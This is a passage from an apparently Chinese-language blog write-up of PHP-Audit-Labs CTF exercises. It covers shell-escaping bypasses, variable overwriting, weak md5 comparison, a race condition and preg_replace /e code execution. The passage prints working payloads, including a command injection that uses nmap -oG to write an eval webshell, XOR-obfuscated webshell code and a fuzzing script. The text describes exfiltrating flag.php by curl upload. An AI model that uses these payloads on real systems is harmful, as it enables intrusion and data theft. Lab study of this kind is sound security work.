src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/27.png" class title="Da4er"><br>发现即使字符串中包含&lt;&gt;也是可以进入判断体的，这就造成了绕过。</p><p>其实不光strpos函数，==号也存在这样的问题，==号出现的问题叫做弱类型比较。因为==号在比较时会先转换成相同的类型在比较，这就造成了绕过。<br>实列代码如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/28.png" class title="Da4er"></p><hr><h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><h3 id="escapeshellcmd与escapeshellarg"><a href="#escapeshellcmd与escapeshellarg" class="headerlink" title="escapeshellcmd与escapeshellarg"></a>escapeshellcmd与escapeshellarg</h3><p>作用范围：Linux<br>两个函数作用如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/29.png" class title="Da4er"><br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/30.png" class title="Da4er"><br>实列代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Create By Da4er.</span><br><span class="line"> *&#x2F;</span><br><span class="line">$shell_string &#x3D; &quot;&#39;&lt;?php phpinfo() ?&gt; -oG hack.php&#39;&quot;;</span><br><span class="line">$shell1 &#x3D; escapeshellarg($shell_string);</span><br><span class="line">$shell2 &#x3D; escapeshellcmd($shell1);</span><br><span class="line">echo $shell1.&quot;\n&quot;;</span><br><span class="line">echo $shell2.&quot;\n&quot;;</span><br></pre></td></tr></table></figure><br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/31.png" class title="Da4er"><br>根据运行结果看出：先将字符串经过escapeshellarg转换成shell能识别的字符，在用escapeshellcmd对字符串进行转义，可以造成字符逃逸执行特殊命令。<br>官方解释如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/32.png" class title="Da4er"></p><h3 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h3><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/33.png" class title="Da4er"><p>题目对host参数用上述两个函数进行了过滤，可以逃逸出去。在结合nmap的命令可以写入shell到网站。<br>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</span><br></pre></td></tr></table></figure><br>-oG参数可以将前面的一句话写到hack.php中。</p><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>题目如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">function waf($a)&#123;</span><br><span class="line">    foreach($a as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;</span><br><span class="line">            exit(&#39;are you a hacker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">if($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">if($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">if(isset($_GET[&#39;flag&#39;]))&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123;</span><br><span class="line">        exit(&#39;error&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;</span><br><span class="line">        $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">        $urlInfo &#x3D; parse_url($url);</span><br><span class="line">        if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123;</span><br><span class="line">            die( &quot;scheme error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $url &#x3D; escapeshellarg($url);</span><br><span class="line">        $url &#x3D; escapeshellcmd($url);</span><br><span class="line">        system(&quot;curl &quot;.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>这道题目不光考了两个函数的作用，也考了变量覆盖和md5弱类型比较。<br>首先看变量覆盖的知识点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function waf($a)&#123;</span><br><span class="line">    foreach($a as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;</span><br><span class="line">            exit(&#39;are you a hacker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">if($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">if($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure><br>这段代码通过一个waf函数将get，post，cookie传进去的参数的参数名不能包含flag，如果这道题是判断的值不能不包含flag的话，直接使用数组绕过即可，但是判断的是参数名，我们还需要另想办法，最后发现倒数一二行有个extract函数，可以变量覆盖。但是设置了EXTP_SKIP参数，表示如果前面存在参数就不进行变量覆盖，最后看一下这个很关键的数组。这个数组的逻辑是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$__R如果存在，就循环遍历_POST,_GET,_COOKIE的键名和值，如果相等，就会unset变量。</span><br></pre></td></tr></table></figure><br>那么绕过就可以从这个开始：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先通过get传递flag&#x3D;test，通过post传递_GET[flag]。则$$__就是$_GET[flag]，$__v为test，即可消除变量。但是在最后有个extract函数，有会在创建一个$_GET[flag]&#x3D;test从而绕过waf函数。</span><br></pre></td></tr></table></figure><br>md5弱类型比较好绕过这里不在说明。<br>最后就是escapeshellarg和 escapeshellcmd的绕过，关键在于一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">escapeshellcmd ，会对以下的字符进行转义&amp;#;|*?~&lt;&gt;^()[]&#123;&#125;$, x0A 和 xFF, &#39; 和 &quot;仅在不配对儿的时候被转义。</span><br></pre></td></tr></table></figure><br>将不匹配的’和”转义，说明我们在传入的参数中添加个单引号即可绕过。<br>最后就是curl如何读取flag.php文件了，这里我们可以设置个vps监听，然后通过-F参数上传本地的flag.php到一个网站，这里拿百度为例，payload如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/34.png" class title="Da4er"><br>这里我没有复现成功，因为要想这么使用对curl的版本也是有要求的，最后附上wp的说明。<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/35.png" class title="Da4er"></p><hr><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><h3 id="正则使用不当导致的路径穿越问题"><a href="#正则使用不当导致的路径穿越问题" class="headerlink" title="正则使用不当导致的路径穿越问题"></a>正则使用不当导致的路径穿越问题</h3><p>看题目给的实列：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/36.png" class title="Da4er"><br>在第20行unlink函数之前没有对传入的$file变量进行过滤，导致我们可以进行目录穿越来删除任意文件。<br>看官方给的说明：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/37.png" class title="Da4er"></p><h3 id="CTF-Docker-题目-2"><a href="#CTF-Docker-题目-2" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h3><p>题目如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if  (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;])</span><br><span class="line">&#123;</span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">    if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#39;Wrong Format&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    while (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            break;</span><br><span class="line">        $c &#x3D; 0;</span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">            $c +&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3) break;</span><br><span class="line">        if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag;</span><br><span class="line">        else echo &#39;Wrong password&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>在本地进行转换代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Create By Da4er.</span><br><span class="line"> *&#x2F;</span><br><span class="line">$password &#x3D;@$_POST[&#39;password&#39;];</span><br><span class="line">if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password))</span><br><span class="line">&#123;</span><br><span class="line">    echo &#39;Wrong Format&#39;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">    if (6 &gt; preg_match_all($reg, $password, $arr))&#123;</span><br><span class="line">        echo &#39;wrong&#39;;</span><br><span class="line">        echo preg_match_all($reg, $password, $arr);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo 1111;</span><br><span class="line">        $c &#x3D; 0;</span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">                $c +&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3)&#123;</span><br><span class="line">            echo &quot;da4er&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo 2222;</span><br><span class="line">            if (&quot;42&quot; &#x3D;&#x3D; $password)&#123;</span><br><span class="line">                echo &quot;true&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &quot;false&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>正则如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/43.png" class title="Da4er"><br>经过了三次正则判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一.判断password变量里面有12个或12个以上的可打印字符</span><br><span class="line">二.password变量的打印字符，十进制数，小写字母，大写字母大于等于6</span><br><span class="line">三.匹配password中的字符，十进制数，小写字母，大写字母，如果匹配到$c变量加一</span><br></pre></td></tr></table></figure><p>经过上面的逻辑判断，payload如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/39.png" class title="Da4er"><br>即可绕过正则。<br>这里需要注意：<strong>弱类型比较漏洞，必须要进行类型转换，像本题的最后一个就是弱类型比较，进绕过时传入的password变量必须是int类型（一个小坑）</strong></p><h2 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h2><h3 id="parse-str引起的变量覆盖"><a href="#parse-str引起的变量覆盖" class="headerlink" title="parse_str引起的变量覆盖"></a>parse_str引起的变量覆盖</h3><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/44.png" class title="Da4er"><p>测试代码如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/45.png" class title="Da4er"></p><h3 id="CTF-Docker-题目-3"><a href="#CTF-Docker-题目-3" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h3><p>题目如下：<br><strong>index.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;hongri&quot;;</span><br><span class="line">echo $a;</span><br><span class="line">$id &#x3D; @$_GET[&#39;id&#39;];</span><br><span class="line">@parse_str($id);</span><br><span class="line">if ($a[0] !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) &#x3D;&#x3D; md5(&#39;QNKCDZO&#39;)) &#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;uploadsomething.php&quot;&gt;flag is here&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo $a[0];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><strong>uploadsoming.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$referer &#x3D; $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">if(isset($referer)!&#x3D;&#x3D; false) &#123;</span><br><span class="line">    $savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;</span><br><span class="line">    if (!is_dir($savepath)) &#123;</span><br><span class="line">        $oldmask &#x3D; umask(0);</span><br><span class="line">        mkdir($savepath, 0777);</span><br><span class="line">        umask($oldmask);</span><br><span class="line">    &#125;</span><br><span class="line">    if ((@$_GET[&#39;filename&#39;]) &amp;&amp; (@$_GET[&#39;content&#39;])) &#123;</span><br><span class="line">        &#x2F;&#x2F;$fp &#x3D; fopen(&quot;$savepath&quot;.$_GET[&#39;filename&#39;], &#39;w&#39;);</span><br><span class="line">        $content &#x3D; &#39;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#39;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">        $msg &#x3D; &#39;Flag is here,come on~ &#39; . $savepath . htmlspecialchars($_GET[&#39;filename&#39;]) . &quot;&quot;;</span><br><span class="line">        echo $msg;</span><br><span class="line">        usleep(100000);</span><br><span class="line">        $content &#x3D; &quot;Too slow!&quot;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">    &#125;</span><br><span class="line">   print &lt;&lt;&lt;EOT</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">&lt;label for&#x3D;&quot;exampleInputEmail1&quot;&gt;Filename&lt;&#x2F;label&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;form-control&quot; name&#x3D;&quot;filename&quot; id&#x3D;&quot;exampleInputEmail1&quot; placeholder&#x3D;&quot;Filename&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">&lt;label for&#x3D;&quot;exampleInputPassword1&quot;&gt;Content&lt;&#x2F;label&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;form-control&quot; name&#x3D;&quot;content&quot; id&#x3D;&quot;exampleInputPassword1&quot; placeholder&#x3D;&quot;Contont&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-default&quot;&gt;Submit&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">EOT;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#39;you can not see this page&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>在index.php中可以通过parse_str进行变量覆盖：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/40.png" class title="Da4er"><br>在uploadsoming.php中主要使用的竞争原理，关键函数<strong>usleep(100000)</strong><br>关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((@$_GET[<span class="string">'filename'</span>]) &amp;&amp; (@$_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">       <span class="comment">//$fp = fopen("$savepath".$_GET['filename'], 'w');</span></span><br><span class="line">       $content = <span class="string">'HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r'</span>;</span><br><span class="line">       file_put_contents(<span class="string">"$savepath"</span> . $_GET[<span class="string">'filename'</span>], $content);</span><br><span class="line">       $msg = <span class="string">'Flag is here,come on~ '</span> . $savepath . htmlspecialchars($_GET[<span class="string">'filename'</span>]) . <span class="string">""</span>;</span><br></pre></td></tr></table></figure><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/46.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/41.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/42.png" class title="Da4er"><hr><h2 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h2><h3 id="preg-replace与代码执行"><a href="#preg-replace与代码执行" class="headerlink" title="preg_replace与代码执行"></a>preg_replace与代码执行</h3><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/47.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/48.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/49.png" class title="Da4er"><p>测试代码如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/50.png" class title="Da4er"><br>上面那段代码的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p>这里主要利用了三个知识点：<strong>preg_replace()函数/e模式导致的代码执行，正则中(\1)表示捕获第一个匹配的字符串，双引号导致的变量解</strong> <strong>析(可变变量)</strong><br>参考博客：<br><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><h3 id="CTF-Docker-题目-4"><a href="#CTF-Docker-题目-4" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h3><p>有两道CTF题目，代码如下：<br>一<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/51.png" class title="Da4er"><br>这道题主要利用了无字母或数字的webshell，参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list&quot;%3Ehttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list">p神博客</a><br>fuzz脚本如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/52.png" class title="Da4er"><br>将这些数字对应的ascii找出来，在url编码一下，得到payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;</span><br><span class="line">等效于：</span><br><span class="line">$_&#x3D;getFlag;</span><br></pre></td></tr></table></figure><p>最后利用：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/53.png" class title="Da4er"></p><hr><p>二<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/54.png" class title="Da4er"><br>相比于第一个，过滤了下划线。可以使用中文字符代替，或者测试一些那些字符可以当作变量名fuzz脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    asc &#x3D; &quot;%%%02x&quot; % i</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;PHP&#x2F;ceshi&#x2F;webshell&#x2F;index.php?code&#x3D;$%s&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%%1c%%1e%%0f%%3d%%17%%1a%%1c&quot;;$%s();&#39; % (asc,asc)</span><br><span class="line">    r &#x3D; requests.get(url)</span><br><span class="line">    if &#39;flag&#39; in r.text:</span><br><span class="line">        print(&quot;%s 可用&quot; % asc)</span><br></pre></td></tr></table></figure><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 